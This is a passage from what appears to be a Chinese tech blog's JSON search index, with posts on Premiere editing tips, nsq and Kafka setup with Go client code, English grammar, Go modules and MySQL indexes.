c 剪刀\n+ m 标记\n+ ~ 全屏\n+ space 播放/暂停\n+ 左右箭头  手动走帧\n+ alt+鼠标滚轮  放大缩小序列\n+ del 删除\n\n### 3. 插件\n\n+ 磨皮插件 Digital Anarchy Beauty Box\n\n  + show mask\n\n  + 吸取低颜色和高颜色\n  + 调节第二个参数(skin detail amount?), 加大磨皮\n\n### 4. 遇到的问题\n\n+ Q: 音效帧无法控制\n\n  A: 把效果->级别上面的那个属性(Bypass/旁路)给关闭\n\n+ Q: 无法删除视频转场\n\n  A: 把视频段宽度降低或增大, 点击转场文字,删除\n\n### 5. 技巧\n\n+ 序列归类合并\n\n  1. 每个音频可以新建一个同名序列, 然后剪辑后形成新的序列\n\n  2. 最后新建一个序列, 把之前的序列都拖到过来\n\n  3. 如果视频比较大, 可以把步骤1的序列导出为视频, 再进行第二个步骤\n\n+ 剪辑收尾\n  1. 音效K帧变负无穷\n  2. 可以导出帧,形成一个png, 停留几秒\n\n### 6. 参考教程\n\n+ https://www.bilibili.com/video/av8703816/","tags":["photo"],"categories":["摄影"]},{"title":"nsq的介绍和使用","url":"%2Fp%2F17c769c4.html","content":"\n# 1. nsq 介绍\n\n[nsq](https://github.com/bitly/nsq)是一个基于Go语言的分布式实时消息平台，nsq可用于大规模系统中的实时消息服务，并且每天能够处理数亿级别的消息，其设计目标是为在分布式环境下运行的去中心化服务提供一个强大的基础架构。\n\n<!-- more -->\n\n### 1.1 nsq 的组成\n\nnsq是由四个重要组件构成：\n\n- [nsqd](http://bitly.github.io/nsq/components/nsqd.html)：一个负责接收、排队、转发消息到客户端的守护进程\n- [nsqlookupd](http://bitly.github.io/nsq/components/nsqlookupd.html)：管理拓扑信息并提供最终一致性的发现服务的守护进程\n- [nsqadmin](http://bitly.github.io/nsq/components/nsqadmin.html)：一套Web用户界面，可实时查看集群的统计数据和执行各种各样的管理任务\n- [utilities](http://nsq.io/components/utilities.html)：常见基础功能、数据流处理工具，如nsq_stat、nsq_tail、nsq_to_file、nsq_to_http、nsq_to_nsq、to_nsq\n\n### 1.2 nsq的主要特点\n\n- 具有分布式且无单点故障的拓扑结构 支持水平扩展，在无中断情况下能够无缝地添加集群节点\n- 低延迟的消息推送，参见官方提供的[性能说明文档](http://nsq.io/overview/performance.html)\n- 具有组合式的负载均衡和多播形式的消息路由\n- 既擅长处理面向流（高吞吐量）的工作负载，也擅长处理面向Job的（低吞吐量）工作负载\n- 消息数据既可以存储于内存中，也可以存储在磁盘中\n- 实现了生产者、消费者自动发现和消费者自动连接生产者，参见nsqlookupd\n- 支持安全传输层协议（TLS），从而确保了消息传递的安全性\n- 具有与数据格式无关的消息结构，支持JSON、Protocol Buffers、MsgPacek等消息格式\n- 非常易于部署（几乎没有依赖）和配置（所有参数都可以通过命令行进行配置）\n- 使用了简单的TCP协议且具有多种语言的客户端功能库\n- 具有用于信息统计、管理员操作和实现生产者等的HTTP接口\n- 为实时检测集成了统计数据收集器[StatsD](https://github.com/etsy/statsd/)\n- 具有强大的集群管理界面，参见nsqadmin\n\n\n\n# 2. nsq 组件\n\n### 2.1 nsqd (真正干活的)\n\n1. nsqd 是一个守护进程，负责接收，排队，投递消息给客户端\n2. 简单的说，真正干活的就是这个服务，它主要负责message的收发，队列的维护。nsqd会默认监听一个tcp端口(4150)和一个http端口(4151)以及一个可选的https端口\n3. nsqd 具有以下功能或特性\n\n* 对订阅了同一个topic，同一个channel的消费者使用负载均衡策略（不是轮询）\n* 只要channel存在，即使没有该channel的消费者，也会将生产者的message缓存到队列中（注意消息的过期处理）\n* 保证队列中的message至少会被消费一次，即使nsqd退出，也会将队列中的消息暂存磁盘上(结束进程等意外情况除外)\n* 限定内存占用，能够配置nsqd中每个channel队列在内存中缓存的message数量，一旦超出，message将被缓存到磁盘中\n* topic，channel一旦建立，将会一直存在，要及时在管理台或者用代码清除无效的topic和channel，避免资源的浪费\n\n\n\n### 2.2 nsqlookupd(中心管理服务)\n\n0. nsqlookupd是守护进程负责管理拓扑信息。客户端通过查询 nsqlookupd 来发现指定话题（topic）的生产者，并且 nsqd 节点广播话题（topic）和通道（channel）信息\n\n1. 简单的说nsqlookupd就是中心管理服务，它使用tcp(默认端口4160)管理nsqd服务，使用http(默认端口4161)管理nsqadmin服务。同时为客户端提供查询功能\n\n2. nsqlookupd具有以下功能或特性\n\n* 唯一性，在一个Nsq服务中只有一个nsqlookupd服务。当然也可以在集群中部署多个nsqlookupd，但它们之间是没有关联的\n* 去中心化，即使nsqlookupd崩溃，也会不影响正在运行的nsqd服务\n* 充当nsqd和naqadmin信息交互的中间件\n* 提供一个http查询服务，给客户端定时更新nsqd的地址目录 \n\n\n\n### 2.3 nsqadmin(展示数据)\n\n0. 是一套 WEB UI，用来汇集集群的实时统计，并执行不同的管理任务\n1. nsqadmin具有以下功能或特性\n    * 提供一个对topic和channel统一管理的操作界面以及各种实时监控数据的展示，界面设计的很简洁，操作也很简单\n    * 展示所有message的数量，恩....装X利器\n    * 能够在后台创建topic和channel，这个应该不常用到\n    * nsqadmin的所有功能都必须依赖于nsqlookupd，nsqadmin只是向nsqlookupd传递用户操作并展示来自nsqlookupd的数据\n\n\n\n# 3. nsq 操作\n\n### 3.1 安装和启动\n\n安装 nsq\n\n``` bash\nbrew install nsq \n```\n\n启动 nsqlookupd\n\n```bash\nnsqlookupd\n\n[nsqlookupd] 2020/07/14 13:10:26.005144 INFO: nsqlookupd v1.2.0 (built w/go1.13.5)\n[nsqlookupd] 2020/07/14 13:10:26.006620 INFO: HTTP: listening on [::]:4161 # 管理 nsqd\n[nsqlookupd] 2020/07/14 13:10:26.006620 INFO: TCP: listening on [::]:4160 # 管理 nsqadmin\n```\n\n启动 nsqd\n\n```bash\nnsqd --lookupd-tcp-address=127.0.0.1:4160 -broadcast-address=127.0.0.1\n\n[nsqd] 2020/07/14 13:11:55.889343 INFO: nsqd v1.2.0 (built w/go1.13.5)\n[nsqd] 2020/07/14 13:11:55.889519 INFO: ID: 24\n[nsqd] 2020/07/14 13:11:55.889954 INFO: NSQ: persisting topic/channel metadata to nsqd.dat\n[nsqd] 2020/07/14 13:11:55.909569 INFO: TCP: listening on [::]:4150 # tcp监听4150\n[nsqd] 2020/07/14 13:11:55.909673 INFO: HTTP: listening on [::]:4151 # http监听4151\n[nsqd] 2020/07/14 13:11:55.909858 INFO: LOOKUP(127.0.0.1:4160): adding peer\n[nsqd] 2020/07/14 13:11:55.909872 INFO: LOOKUP connecting to 127.0.0.1:4160\n[nsqd] 2020/07/14 13:11:55.914186 INFO: LOOKUPD(127.0.0.1:4160): peer info {TCPPort:4160 HTTPPort:4161 Version:1.2.0 BroadcastAddress:liuweideMacBook-Air.local}\n```\n\n启动 nsqadmin\n\n```bash\nnsqadmin --lookupd-http-address=127.0.0.1:4161\n\n[nsqadmin] 2020/07/14 13:13:39.580161 INFO: nsqadmin v1.2.0 (built w/go1.13.5)\n[nsqadmin] 2020/07/14 13:13:39.581124 INFO: HTTP: listening on [::]:4171 # 监听4171\n```\n\n### 3.2 操作\n\n+ 浏览器访问 http://127.0.0.1:4171/ 观察数据\n\n+ 发布一个消息 \n\n  ```bash\n  curl -d 'levonfly1' 'http://127.0.0.1:4151/pub?topic=test'\n  ```\n\n+ 创建一个消费者\n\n  ```bash\n  nsq_to_file --topic=test --output-dir=/tmp --lookupd-http-address=127.0.0.1:4161\n  ```\n  可以在/tmp/文件夹内看到输入的消息log\n\n  \n\n+ 再发布几个消息\n\n  ```bash\n  curl -d 'levonfly2' 'http://127.0.0.1:4151/pub?topic=test'\n  curl -d 'levonfly3' 'http://127.0.0.1:4151/pub?topic=test'\n  ```\n\n\n\n# 4. golang 使用 nsq\n\n### 4.1 生产者\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"time\"\n\n\tnsq \"github.com/nsqio/go-nsq\"\n)\n\nfunc main() {\n\tcfg := nsq.NewConfig()\n\t// 连接 nsqd 的 tcp 连接\n\tproducer, err := nsq.NewProducer(\"127.0.0.1:4150\", cfg)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// 发布消息\n\tvar count int\n\tfor {\n\t\tcount++\n\t\tbody := fmt.Sprintf(\"test %d\", count)\n\t\tif err := producer.Publish(\"test\", []byte(body)); err != nil {\n\t\t\tlog.Fatal(\"publish error: \" + err.Error())\n\t\t}\n\t\ttime.Sleep(1 * time.Second)\n\t}\n}\n```\n\n### 4.2 消费者\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\n\t\"github.com/nsqio/go-nsq\"\n)\n\nfunc main() {\n\tcfg := nsq.NewConfig()\n\tconsumer, err := nsq.NewConsumer(\"test\", \"levonfly\", cfg)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// 处理信息\n\tconsumer.AddHandler(nsq.HandlerFunc(func(message *nsq.Message) error {\n\t\tlog.Println(string(message.Body))\n\t\treturn nil\n\t}))\n\n\t// 连接 nsqd 的 tcp 连接\n\tif err := consumer.ConnectToNSQD(\"127.0.0.1:4150\"); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\t<-consumer.StopChan\n}\n```","tags":["nsq"],"categories":["中间件"]},{"title":"英语语法结构","url":"%2Fp%2Fd2e27e6.html","content":"\n# 一. 句子结构\n\n主语: Subject -> 动作的发出者\n\n谓语: Verb -> 动作\n\n宾语: Object -> 动作的承受者\n\n\n\n### 1.1 简单句:  主语 + 谓语 + 宾语\n\n### 1.2 并列句:  主谓宾 + 并列词 + [主]谓宾\n\n+ 并列词: and, or, but, not only…but also\n\n+ 两个句子是同等地位\n\n### 1.3 复合句:  主谓宾(主句) + 从句引导词 + 主谓宾(从句)\n\n+ 从句引导词: which, when, where\n\n+ 主句是主导地位, 从句是从属地位\n+ 从句类型:\n  + 名词性从句(名词)\n  + 定语从句(形容词)\n  + 状语从句(副词)\n\n#### 1.4 总结\n\n+ 句子必须有谓词\n+ 一个简单句子不能出现多个谓词\n\n<!-- more -->\n\n# 二. 简单句的变种(六个句型)\n\n### 2.1 主 + 谓 + 宾\n\n+ 主: 名词\n\n+ 谓: 及物动词(后面可以接物体)\n+ 宾: 名词\n\n### 2.2 主 + 谓\n\n+ 谓: 不及物动词(后面不接物体)\n\n### 2.3 主 + 系 + 表\n\n+ 系: 系动词\n\n  + Be 动词 am, is, are, was, were\n\t+ 感官动词(五官)\n  \t\n\t\t+ look(看起来), sound(听起来),smell(闻起来), taste(尝起来), feel(感觉)\n\t+ 变化动词\n\t  + become(变得), turn(变成), go(变得), get(变得), grow(成长)\n\t+ 静止动词\n  + stay, remain, keep\n+ 表语\n  + 名词\n  + 形容词\n  + 不定式(to do 不定式)\n  + 介宾\n    + 介词:  in on to\n    + 介词 + 动名词\n\n\n\n### 2.4 主 + 谓 + 宾 + 宾(作用于多个承受者)\n\nI give you money.\n\n### 2.5 主 + 谓 + 宾 + 补(结构完整,意思不完整)\n\nThe music makes me sad.\n\n+ 主: 名词\n+ 谓: 及物动词\n+ 宾: 名词\n+ 补:\n  + 形容词\n  + to do 不定式\n\n### 2.6 There be + 名词 + [介宾] (表达存在)\n\nThere is a dog.  //这里有条狗 (有是存在的意思, 不是 have 的意思)\n\nThere is a dog under the tree. //树下有条狗\n\n\n\n# 三. 从句: 引导词+主谓宾(小弟)\n\n\n\n### 3.1 名词性从句(句子的名词复杂)\n\n+ 一模一样的句子, 只不过位置不同, 所以名称不同\n\n+ 引导词 + 从句 降级变成了名词\n\n\n| 主                   | 谓       | 宾                   |\n| -------------------- | -------- | -------------------- |\n| 名词                 | 及物动词 | 名词                 |\n| 如果在这里->主语从句 |          | 如果在这里->宾语从句 |\n\n##### 1 主语从句\n\nThat he likes football surprised us.\n\n##### 2 宾语从句\n\nHe said that he likes football.\n\n##### 3 表语从句\n\nThe fact is that he likes football.\n\n##### 4 同位语从句(引导词常见 that)\n\n同位语是解释名词的名词, 2个名词地位相等\n\n同位语:\n\n+ Levon, a love man, loves spring. (同位语主语)\n\n+ Levon loves spring, one of  the four. (同位语宾语)\n\n同位语从句:\n\n+ The fact, that he likes football suprised us.\n\n+ He states the fact that he likes football.\n\n\n\n\n### 3.2 定语从句(修饰句子的某个名词)\n\n定语: 修饰名词, 分为两种: \n\n定1: 形容词(短一些)\n\n定2: 短语(介宾或 to do 不定式)或定语从句(长一些)\n\n+ 英语不喜欢头重脚轻的句子, 如果是, 请变成头轻脚重, 长的在名词后面放着\n+ (定1 主语 定2)  + 谓语 + (定1 + 宾语 + 定2)\n\n定语例子: \n\n+ A beautiful(定1) girl shard a facinating story.\n\n+ A gril from Mars(定2短语) shard a story about her people(定2短语).\n+ A task to tackle(定2短语) is the potatial(定1) creiss.\n\n定语从句例子:\n\n+ A girl who likes spring(定2从句) shard a story which moved us(定2从句).\n+ A beautiful(定1) girl from Mas(定2短语) who likes spring(定2从句) shard a faciting(定1) story about her people(定2短语) which moved us(定2从句).\n\n\n\n### 3.3 状语从句(修饰句子的某个动词或形容词)\n\n+ 就是副词, 修饰动词, 形容词或整个句子\n\n+ 起副词作用的句子就是状语从句\n\n##### 1  时间状语\n\n何时\n\n##### 2 地点状语\n\n在哪\n\n##### 3 原因状语\n\n为啥\n\n##### 4 条件状语\n\n在什么情况下\n\n##### 5 目的状语\n\n为了啥\n\n##### 6 结果状语\n\n导致了啥\n\n##### 7 让步状语\n\n转折\n\n##### 8 方式状语\n\n怎么发生的 \n\n\n\n状语例子\n+ Levon smiles happily. (修饰动词, 副词在后)\n+ Levon quickly understand. (修辞动词, 副词在前)\n+ She is strikingly beautiful.(修饰形容词)\n+ He is pretty tall.(修饰形容词)\n\n时间副词\n+ He came yesterday.\n+ Yesterday He came.\n\n时间状语从句\n+ He called me when I was sleeping.\n\n地点副词:\n+ He celebrated his birthday at school.\n+ At school he celebrated his brithday.\n\n地点状语从句\n+ We met where we used to go for a walk.\n\n原因状语从句:\n+ He likes spring for it is beautiful.\n+ He likes spring since it is beautiful.(除了 since, 其他引导词都不能在前面)\n\n条件状语从句:\n+ If you win, there will be a reward.\n+ As long as you win, there will be a reward.\n\n目的状语\n+ I study for my well-being.\n+ I don't spend extra to save money.\n+ I don't spend extra so that I can save money.(从句)\n\n方式状语\n+ I learned English through an online course.\n+ I contact my friends via wechat.\n\n结果状语从句\n+ He tried so hard that he finally successed.\n\n让步状语从句(后面不要转接词)\n+ Although you have a point there, i don't agree with your proposal.\n\n\n\n\n\n# 四. 三个特殊句式\n\n### 4.1 强调句\n\n+ He hit me.\n\n  It was him that hit me.\n\n+ I learn about this project through this site.\n\n  It was through this site that I learned about this project.\n\n强调的内容在 it is 的后面\n\nIt is 名词 that 动词(名词)  \n\nIt is 介宾 that 主谓(宾)\n\n\n\n### 4.2 倒装句\n\n正常句: 主谓(宾)\n\n倒装句: 谓主(宾) \n\n+ We can win only when we try harder.\n\n  Only when we try harder can we win.\n\n+ We can win only through hard work.\n\n  Only through hard work can we win.\n\n\n\n### 4.3 虚拟语气\n\n假设一件有可能发生的事情 -> 条件状语从句\n\n假设一件不可能发生的事情(我是个女的?) -> 虚拟语气\n\n+ 条件状语从句(主将从现)\n\nIf it rains, the event will be canceled.\n\n+ 虚拟语气\n\n  + 现在不可能(一般过去时)\n\n    If i were a girl, i would be a soldier.\n\n  + 过去不可能(过去完成时)\n\n    I had studied English, it would have been easier now.\n\n\n\n\n\n\n\n# 五. 时态\n\n\n\n一般(习惯性) \n\n+ 现在\n+ 过去\n+ 将来\n\n进行(正在发生)\n\n+ 现在\n+ 过去\n+ 未来\n\n完成(有结果,造成了影响)\n\n+ 现在(对现在有影响)\n+ 过去(对昨天有影响)\n+ 将来(对明天有影响)\n\n\n\n# 六. 语态\n\n### 5.1 主动语态\n\nI finished my task.\n\n### 5.2 被动语态(Be 动词+ 动词过去分词)\n\nMy task is finished.\n\n\n\n# 七. 非谓语\n\n不是谓语, 但是和动作有关系(动词分词), 像是引导词\n\n分词\n\n+ 现在分词(doing) 主动关系做了\n\n+ 过去分词(done) 被动关系做了\n\n  \n\n+ The boy was lost, failing to find the way back here.\n+ The boy was lost, failed by his poor memory.\n\n\n\n\n\n# 八. 英语句子成分\n\n+ 一个句子最最基本的成分是主语和谓语,二者缺一不可,否则就不是完整的句子.\n+ 主语可以简单的理解成名词, 谓语可以简单理解为动词\n+ 宾语一般也是名词, 句子承受者\n+ 定语简单理解为形容词\n+ 表语, 常见系表结构, 通常也是形容词\n+ 状语简单理解为副词, 说明地点、时间、原因、目的、结果、条件、方向、程度、方式和伴随状况等。 \n\n","tags":["english"],"categories":["英语"]},{"title":"kafka介绍和使用","url":"%2Fp%2Ff03714cc.html","content":"\n# 1. kafka介绍\n\n\nKafka 是 linkedin 用于日志处理的分布式消息队列，同时支持离线和在线日志处理。kafka 对消息保存时根据 Topic 进行归类，发送消息者成为 Producer,消息接受者成为 Consumer,此外 kafka 集群有多个 kafka 实例组成，每个实例(server)称为 broker。无论是 kafka集群，还是 producer 和 consumer 都依赖于 zookeeper 来保证系统可用性，为集群保存一些 meta 信息。\n\n<!-- more -->\n\n### 1.1 redis 消息订阅和发布的区别\n\n老板有个好消息要告诉大家，有两个办法:\n1.到每个座位上挨个儿告诉每个人。什么？张三去上厕所了？那张三就只能错过好消息了！\n2.老板把消息写到黑板报上，谁想知道就来看一下，什么？张三请假了？没关系，我一周之后才擦掉，总会看见的！什么张三请假两周？那就算了，我反正只保留一周，不然其他好消息没地方写了\n\nredis用第一种办法，kafka用第二种办法，知道什么区别了吧\n\n\n\n# 2. 安装和使用\n\n### 2.1 mac\n\n```bash\nbrew install kafka  # 如果报错，提示安装 java, 安装即可\n\nzookeeper-server-start /usr/local/etc/kafka/zookeeper.properties & kafka-server-start /usr/local/etc/kafka/server.properties  # 临时启动，先启动 zookeeper, 再启动 kafaka\n\n# 此时用 ps 查看进程可以看到是用 java 起来的。\n```\n\n### 2.3 使用\n\n创建Topic\n\n```bash\nkafka-topics --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test\n```\n\n产生消息\n\n```bash\nkafka-console-producer --broker-list localhost:9092 --topic test\n```\n\n消费\n\n```bash\nkafka-console-consumer --bootstrap-server localhost:9092 --topic test --from-beginning\n```\n\n如果使用消费组\n\n```bash\nkafka-console-consumer --bootstrap-server localhost:9092 --topic test --group test-consumer1 --from-beginning\n```\n\n\n\n# 3.  golang 使用 kafka\n\ngithub 上有多个轮子,选用了star最多的 sarama\n\n+ https://github.com/Shopify/sarama \n+ https://github.com/confluentinc/confluent-kafka-go\n\n### 3.1 生产者\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\n\t\"github.com/Shopify/sarama\"\n)\n\nfunc main() {\n\tconfig := sarama.NewConfig()\n\tconfig.Producer.RequiredAcks = sarama.WaitForAll          // 发送完数据需要leader和follow都确认\n\tconfig.Producer.Partitioner = sarama.NewRandomPartitioner // 新选出一个partition\n\tconfig.Producer.Return.Successes = true                   // 成功交付的消息将在success channel返回\n\n\t// 连接kafka\n\tclient, err := sarama.NewSyncProducer([]string{\"127.0.0.1:9092\"}, config)\n\tif err != nil {\n\t\tfmt.Println(\"producer closed, err:\", err)\n\t\treturn\n\t}\n\tdefer client.Close()\n\t\n\t// 发送消息\n\tmsg := &sarama.ProducerMessage{}\n\tmsg.Topic = \"web_log\"\n\tmsg.Value = sarama.StringEncoder(\"this is a test log1\")\n\tpid, offset, err := client.SendMessage(msg)\n\tif err != nil {\n\t\tfmt.Println(\"send msg failed, err:\", err)\n\t\treturn\n\t}\n\tfmt.Printf(\"pid:%v offset:%v\\n\", pid, offset)\n}\n\n\n```\n\n### 3.2 消费者\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\n\t\"github.com/Shopify/sarama\"\n)\n\nfunc main() {\n\tconsumer, err := sarama.NewConsumer([]string{\"localhost:9092\"}, nil)\n\tif err != nil {\n\t\tfmt.Printf(\"fail to start consumer, err:%v\\n\", err)\n\t\treturn\n\t}\n\n\t// 取出老的值\n\toldest, _ := consumer.ConsumePartition(\"web_log\", 0, sarama.OffsetOldest)\n\tdefer oldest.AsyncClose()\n\tfor msg := range oldest.Messages() {\n\t\tfmt.Printf(\"Partition:%d Offset:%d Key:%v Value:%v\\n\", msg.Partition, msg.Offset, string(msg.Key), string(msg.Value))\n\t}\n\t\n\t// 消费新增加的值\n\tnewest, _ := consumer.ConsumePartition(\"web_log\", 0, sarama.OffsetNewest)\n\tdefer newest.AsyncClose()\n\tfor msg := range newest.Messages() {\n\t\tfmt.Printf(\"Partition:%d Offset:%d Key:%v Value:%v\\n\", msg.Partition, msg.Offset, string(msg.Key), string(msg.Value))\n\t}\n}\n```\n\n\n\n\n# 4. 参考资料\n\n+ https://colobu.com/2019/09/27/install-Kafka-on-Mac/\n","tags":["kafka"],"categories":["中间件"]},{"title":"go-module的使用","url":"%2Fp%2F6c6632b7.html","content":"\n\n\ngolang从诞生之初就一直有个被诟病的问题：缺少一个行之有效的“官方”包依赖管理工具。之前golang包管理工具有数十个， 说实话都不是让人非常满意。\n\ngo 1.11 有了对模块的实验性支持，大部分的子命令都知道如何处理一个模块，比如 run build install get list mod 子命令。go 1.12 会删除对 GOPATH 的支持，go get 命令也会变成只能获取模块，不能像现在这样直接获取一个裸包。\n\n\n\n\n\n可以用环境变量 GO111MODULE 开启或关闭模块支持，它有三个可选值：off、on、auto，默认值是 auto。\n\n- GO111MODULE=off 无模块支持，go 会从 GOPATH 和 vendor 文件夹寻找包。\n- GO111MODULE=on 模块支持，go 会忽略 GOPATH 和 vendor 文件夹，只根据 go.mod 下载依赖。\n- GO111MODULE=auto 在 $GOPATH/src 外面且根目录有 go.mod 文件时，开启模块支持。\n\n在使用模块的时候，GOPATH 是无意义的，不过它还是会把下载的依赖储存在 $GOPATH/pkg/mod 中，也会把 go install 的结果放在 $GOPATH/bin 中。\n\n<!-- more -->\n\n### 1. go mod 使用教程\n\nhttps://github.com/golang/go/wiki/Modules # 官方wiki, 基本所有的问题都能在这里找到\n\n\n\n##### 1.1 在使用前先确保golang升级到1.11:\n\nhttps://golang.org/dl/ #下载golang\n\n\n\n### 2. 使用go mod 实践\n\n\n\n##### 2.1. 快速开始：\n\n1. 把之前的工程拷贝到$GOPATH/src之外\n\n2. 在工程目录下执行：go mod init {module name}，该命令会创建一个go.mod文件\n\n3. 然后在该目录下执行 go build，就可以了，go.mod中记录了依赖包及其版本号。\n\n   \n\n##### 2.2. 在 go build 中 遇到了以下几个问题, 记录如下:\n\n\n\n2.2.1 golang.org的包竟然下不下来(你懂的)\n\n可以使用在go.mod里添加replace选项\n\n```go\nreplace (golang.org/x/text => github.com/golang/text v0.3.0 )\n```\n\n 也可以用代理的方式, 更加方便\n\n```shell\nexport GOPROXY=https://athens.azurefd.net\n```\n\n\n\n2.2.2 发现找不到包(包层级多的)\n\ncannot load github.com/aliyun/alibaba-cloud-sdk-go/sdk: cannot find module providing package github.com/aliyun/alibaba-cloud-sdk-go/sdk\n\n```shell\ngo get github.com/aliyun/alibaba-cloud-sdk-go@master  #带@master\n```\n\n\n\n2.2.3 在替换的时候还发现这个错误\n\ncannot call non-function xurls.Strict (type *regexp.Regexp)\n\n```shell\nmvdan.cc/xurls  #之前用的是这个版本,换成下面的就可以了\nmvdan.cc/xurls/v2\n```\n\n\n\n2.2.4  只有直接使用的依赖会被记录在`go.mod`文件中, 贴出go.mod的内容如下:\n\n```go\nmodule github.com/unix2dos/goods-notify\n\n\n\ngo 1.12\n\n\n\nrequire (\n\n\tgithub.com/PuerkitoBio/goquery v1.5.0\n\n\tgithub.com/aliyun/alibaba-cloud-sdk-go v0.0.0-20190528035818-94084c920892\n\n\tgithub.com/gorilla/websocket v1.4.0 // indirect\n\n\tgithub.com/joho/godotenv v1.3.0\n\n\tgithub.com/pkg/errors v0.8.1 // indirect\n\n\tgithub.com/stretchr/testify v1.3.0\n\n\tgithub.com/unix2dos/bearychat-go v0.0.0-20190222142113-d09d4a5e73e5\n\n\tgithub.com/valyala/fasthttp v1.3.0\n\n\tgithub.com/yunpian/yunpian-go-sdk v0.0.0-20171206021512-2193bf8a7459\n\n\tgolang.org/x/text v0.3.2\n\n\tmvdan.cc/xurls/v2 v2.0.0\n\n)\n```\n\n\n\n`indirect` 注释标记了依赖不是被当前模块直接使用的，只是在其他依赖项中被间接引用。\n\n\n\n2.2.5  go.sum文件介绍\n\n同时，`go.mod`和`go`命令维护了一个名叫`go.sum`的文件包含了指定模块版本的期望的[加密hash](https://golang.org/cmd/go/#hdr-Module_downloading_and_verification)：\n\n`go`命令使用`go.sum`文件保证之后的模块下载会下载到跟第一次下载相同的文件内容，保证你的项目依赖不会发生预期外的恶意修改、意外问题和其他问题。`go.mod` 和 `go.sum`都需要放进版本管理中。\n\n\n\n### 3. go mod 相关操作\n\n`go list -m all`  可以查看当前的依赖和版本(当前模块，或者叫做主模块，通常是第一行，接下来是根据依赖路径排序的依赖)。\n\n\n\n`go mod edit -fmt` 格式化 `go.mod` 文件。\n\n\n\n `go mod tidy` 从 `go.mod` 删除不需要的依赖、新增需要的依赖，这个操作不会改变依赖版本。\n\n\n\n##### 3.1 go get 命令\n\n获取依赖的特定版本，用来升级和降级依赖。可以自动修改 `go.mod` 文件，而且依赖的依赖版本号也可能会变。在 `go.mod` 中使用 `exclude` 排除的包，不能 `go get` 下来。\n\n\n\n与以前不同的是，新版 `go get` 可以在末尾加 `@` 符号，用来指定版本。\n\n它要求仓库必须用 `v1.2.0` 格式打 tag，像 `v1.2` 少个零都不行的，必须是[语义化](https://semver.org/lang/zh-CN/)的、带 `v` 前缀的版本号。\n\n\n\n```\ngo get github.com/gorilla/mux           # 匹配最新的一个 tag\ngo get github.com/gorilla/mux@latest    # 和上面一样\ngo get github.com/gorilla/mux@v1.6.2    # 匹配 v1.6.2\ngo get github.com/gorilla/mux@e3702bed2 # 匹配 v1.6.2\ngo get github.com/gorilla/mux@c856192   # 匹配 c85619274f5d\ngo get github.com/gorilla/mux@master    # 匹配 master 分支\n```\n\n\n\n`latest` 匹配最新的 tag。\n\n`v1.2.6` 完整版本的写法。\n\n`v1`、`v1.2` 匹配带这个前缀的最新版本，如果最新版是 `1.2.7`，它们会匹配 `1.2.7`。\n\n`c856192` 版本 hash 前缀、分支名、无语义化的标签，在 `go.mod` 里都会会使用约定写法 `v0.0.0-20180517173623-c85619274f5d`，也被称作伪版本。\n\n`go get` 可以模糊匹配版本号，但 `go.mod` 文件只体现完整的版本号，即 `v1.2.0`、`v0.0.0-20180517173623-c85619274f5d`，只不过不需要手写这么长的版本号，用 `go get` 或上文的 `go mod edit -require` 模糊匹配即可，它会把匹配到的完整版本号写进 `go.mod`  文件。\n\n\n\n\n\n参考资料:\n\nhttps://github.com/golang/go/wiki/Modules\n\nhttps://www.jianshu.com/p/c5733da150c6\n\nhttps://www.4async.com/2019/03/using-go-modules/","tags":["golang"],"categories":["golang"]},{"title":"mysql索引介绍","url":"%2Fp%2F84544518.html","content":"\n\n\n# 1. 索引\n\n### 1.1 索引是什么？有什么作用以及优缺点？\n\n- （1）是一种快速查询表中内容的机制，类似于新华字典的目录\n- （2）运用在表中某个些字段上，但存储时，独立于表之外，有一张专门的索引表\n\n<!-- more -->\n\n### 1.2 什么时候要创建索引\n\n- 表经常进行 SELECT 操作\n- 表很大(记录超多)，记录内容分布范围很广\n- 列名经常在 WHERE 子句或连接条件中出现\n\n### 1.3 什么时候不要创建索引\n\n- 表经常进行 INSERT/UPDATE/DELETE 操作\n- 表很小(记录超少)\n- 列名不经常作为连接条件或出现在 WHERE 子句中\n- 字段内容重复很多\n\n\n\n# 2. 索引分类\n\n### 2.1 从存储结构上来划分\n\n- Btree 索引（B+tree，B-tree)\n\n- 哈希索引\n\n  哈希索引一般适用于：不需要做**排序**、**范围查询的需求。**\n\n  - 哈希索引只包含哈希值和行指针，而不存储字段值，所以不能使用索引中的值来避免读取行。不过，访问内存中的行的速度很快，所以大部分情况下这一点对性能的影响并不明显。\n  - 哈希索引数据并不是按照索引值顺序存储的，所以也就无法用于排序。\n  - 哈希索引也不支持部分索引列匹配查找，因为哈希索引始终是使用索引列的全部内容来计算哈希值的。例如，在数据列(A, B)上建立哈希索引，如果查询只有数据列A，则无法使用该索引。\n  - 哈希索引只支持等值比较查询，包括=、in()、<=>。不支持任何范围查询，例如where price > 100。\n  - 访问哈希索引的数据非常快，除非有很多哈希冲突。\n  - 如果哈希冲突很多的话，一些索引维护操作的代价也很高。\n\n- full-index 全文索引\n\n- RTree\n\n\n\n### 2.2 从应用层次上来划分\n\n- 普通索引：即一个索引只包含单个列，一个表可以有多个单列索引。\n- 唯一索引：索引列的值必须唯一，但允许有空值。\n  + 普通唯一索引：单个字段上建立唯一索引，需要此字段所在的列上不能有重复的值，属于二级索引。\n  + 复合唯一索引：多个字段上联合建立唯一索引，属于二级索引。\n- 复合索引：一个索引包含多个列。\n\n\n\n##### 2.2.1 唯一索引和主键索引区别\n\n+ 主键就是唯一索引，但是唯一索引不一定是主键\n\n+ 唯一索引可以为空，但是空值只能有一个，主键不能为空。\n\n##### 2.2.2 复合索引最左前缀匹配\n\n最左前缀匹配原则。这是非常重要、非常重要、非常重要（重要的事情说三遍）\n\n+ 左边的必须在才走索引!!!!!!!!!!!!!!!!\n\n\n\n### 2.3 从表记录的排列顺序和索引的排列顺序是否一致来划分\n\n- 聚集索引：表记录的排列顺序和索引的排列顺序一致。(类似拼音查字)\n\n  + 一个表中只能拥有一个聚集索引。\n\n  + SQL SERVER默认是在主键上建立聚集索引的。\n\n    \n\n  聚集索引表记录的排列顺序和索引的排列顺序一致，所以查询效率快，因为只要找到第一个索引值记录，其余的连续性的记录在物理表中也会连续存放，一起就可以查询到。\n\n  